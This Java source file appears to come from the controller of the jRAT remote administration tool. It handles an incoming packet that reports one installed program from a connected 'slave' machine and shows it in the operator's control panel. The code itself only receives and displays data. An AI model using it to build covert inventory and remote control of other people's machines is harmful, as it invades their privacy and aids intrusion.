package se.jrat.controller.packets.incoming;

import java.io.DataInputStream;

import se.jrat.controller.Slave;
import se.jrat.controller.ui.frames.FrameControlPanel;
import se.jrat.controller.ui.panels.PanelControlInstalledPrograms;


public class Packet55InstalledProgram extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String program = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlInstalledPrograms panel = (PanelControlInstalledPrograms) frame.panels.get("installed programs");
			panel.getModel().addRow(new Object[] { program });
		}
	}

}
